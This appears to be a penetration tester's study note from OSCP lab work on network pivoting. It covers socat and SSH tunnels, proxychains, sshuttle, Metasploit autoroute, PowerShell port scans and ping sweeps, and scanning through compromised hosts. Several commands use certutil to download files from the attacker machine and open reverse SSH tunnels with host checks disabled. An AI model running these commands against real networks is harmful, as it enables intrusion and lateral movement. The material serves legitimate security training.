<%*
const path = tp.file.folder(true).split('/');
const filename = "4_B_Network_" + path[path.length - 1];
await tp.file.rename(filename)
-%>
# Port Redirect

\[Subnets\]                         WAN          |     Subnet  1     |      Subnet 2     |      Subnet 3
\[Hosts\]               Kali    --->   Machine A ---> Machine B ---> Machine C
\-
\[Simple\]                                        Socat                  Target
\[Local\]                                      SSH Client           SSH Server             Target
\[Remote\]     SSH Server          SSH Client              Target

### Simple static
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:$hip:$hport
```
(Machine A)

Alternative with netcat: https://gist.github.com/holly/6d52dd9addd3e58b2fd5
Alternative requiring root rights: iptables
### Local Dynamic
```powershell
ssh -N -D 0.0.0.0:9997 $user_B@$ip_B
```
(Machine A)

```PS
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

### Remote Dynamic with ProxyChains and SSH
> Requires SSH above 7.6. Check with `ssh -V`.
##### 1st Setup (kali machine)
SSH
```
ssh-keygen -t rsa -b 4096 -f ./id_rsa_kali
cat ./id_rsa_kali.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
ProxyChains
```bash
nano /etc/proxychains4.conf
```
> With it, tools that do not support socks proxys by default, can be made compatible with the tunnel IF they are (most) dynamically-linked binaries.
> For local redirects add `socks5 $hip 9999` to the end.
> For remote redirects use `socks5 127.0.0.1 9999`.
> If socks4 is required, UDP and IPv6 won't be supported.
##### Use it
(kali machine)
```bash
sudo systemctl start ssh
```

(Machine A, interactive)
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.195:8000/id_rsa_kali"; ssh -i id_rsa_kali -N -R 9997 kali@192.168.45.195
```
or
(Machine A, non-interactive)
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.182:8000/id_rsa_kali"; ssh -f -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_kali -N -R 9997 kali@$hip
```

(kali machine)
`proxychains <command>` to start e.g. a nmap scan over the pivot. It appears to then not use the IP-Addresses put into `/etc/hosts`

### Remote Dynamic with sshuttle
> Requires python on machine A!

```bash
socat TCP-LISTEN:2222,fork TCP:$ip_B:22
```
(Machine A)

```bash
sshuttle -r $user_A@$ip_A:2222 $subnet_2 $subnet_1
```
(kali machine)

### Remote Dynamic with Metasploit
Within an exististing session:
1. `bg`
2. `use post/multi/manage/autoroute`, `set session 1`, and `run -j` (adjust the session number)
3. `use auxiliary/server/socks_proxy`, `set VERSION 5`, `set SRVHOST 127.0.0.1`, `set SRVPORT 9989`, and `run -j`
4. Add `socks5 127.0.0.1 9989` to `/etc/proxychains4.conf` 
# Fault handling
Test the connection
`proxychains nmap -Pn $hip -p $hport`
`sudo ss -ntplu`

Proxychains does not work with tool (e.g. enum4linux)
`proxychains -q`

Slow scanning speeds
--> lower `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf`

Start SSH Agent on windows
`Get-Service ssh-agent | Select StartType` says disabled
--> `Get-Service -Name ssh-agent | Set-Service -StartupType Manual ; Start-Service ssh-agent`

Warning: remote port forwarding failed for listen port 9997
(After a previous session was killed, e.g. by a machine revert)
![[Pasted image 20231006140936.png]]

Correct ssh-key permissions on windows
```powershell
New-Variable -Name Key -Value "C:\Users\Public\id_rsa_kali"
# Remove Inheritance:
  Icacls $Key /c /t /Inheritance:d

# Set Ownership to Owner:
  # Key's within $env:UserProfile:
    Icacls $Key /c /t /Grant ${env:UserName}:F

   # Key's outside of $env:UserProfile:
     TakeOwn /F $Key
     Icacls $Key /c /t /Grant:r ${env:UserName}:F

# Remove All Users, except for Owner:
  Icacls $Key /c /t /Remove:g Administrator "Authenticated Users" BUILTIN\Administrators BUILTIN Everyone System Users

# Verify:
  Icacls $Key

# Remove Variable:
  Remove-Variable -Name Key
```
# Windows specific

Enable Telnet
```powershell
dism /online /Enable-Feature /FeatureName:TelnetClient
```
Portscan LOLBAS
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("$hip", $_)) "TCP port $_ is open"} 2>$null
```
Pingsweep LOLBAS (**I SPENT SOME TIME FINDING THE MOST EFFICIENT APPROACH AND FORGOT TO NOTE WHICH OF THESE WORKED**)
```powershell
workflow pingsweep { foreach -parallel ($computer in 1..254) { if (Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$computer -Quiet) {echo "192.168.209.$computer"} {echo "nein"} } }; pingsweep
```

```powershell
1..254 | % { if (Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$_ -Quiet) {echo "192.168.209.$_"}} 2>$null
```

```powershell
$(foreach ($computer in 1..254) { Start-Job -ScriptBlock { if ( Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$using:computer -Quiet ) {echo "192.168.209.$using:computer"} } }) | Receive-Job -Wait
```


For port forwarding techniques using the windows tools plink, and netsh, consider the oscp manual

##### Create working dirs and start individual system scanning

```bash
for i in $(tail -n 7 0_Hosts); do (mkdir -p "B_$i" && cd $_ && proxychains nmap -Pn --osscan-guess -T 5 -A --top-ports 100 $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html)& done
```

> **If you have a windows GUI oder linux CLI and Administrator rights, scan from the remote host itself:**

##### Scan with nmap from Windows
1. Install nmap, requires GUI
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.158:8000/nmap-7.94-win-setup.exe" ; .\nmap-7.94-win-setup.exe
```
You can find the installer in `/ftphome/`
2. Run pingsweep and add new hosts to `/etc/hosts`. Also, add them to `ips.txt` on the windows host 
```powershell
& "C:\Program Files (x86)\Nmap\nmap.exe" -sn 172.16.199."1-254" -oG - | findstr "Status: Up"
```
3. Run full scan
   ```powershell
ForEach ($i in $(Get-Content -Path ips.txt)){& "C:\Program Files (x86)\Nmap\nmap.exe" --osscan-guess -T 5 -A -p- $i -oX "C:\Users\tempadmin\${i}_fullscan.xml" }; 
ForEach ($i in $(Get-Content -Path ips.txt)){& "C:\Program Files (x86)\Nmap\nmap.exe" -sUV --top-ports 100 $i -oN "C:\Users\tempadmin\0_udp_top100_${i}.txt" }
```
4. Zip the resulting files and transfer them to kali, e.g. with:
```powershell
scp -i id_rsa_kali transfer.zip kali@192.168.45.158:'/home/kali/oscp/lab/Medtech/A_WEB02/extract'
```
5. Unzip the file and move all files to their respective host's folder.
7. Change the path within the .xml files so that xlstproc can find the nmap stylesheet, then run the latter.
```bash
for i in $(find .. -name "*fullscan.xml" | tr '\n' ' '); do \
cd ../$(echo $i | cut -d '/' -f2); \
mv 0_overview.html overview_from_A.html.bak; \
sed -i 's/C:\/Program Files (x86)\/Nmap\/nmap.xsl/usr\/bin\/..\/share\/nmap\/nmap.xsl/g' $i; \
xsltproc -o 0_overview.html $i; done
```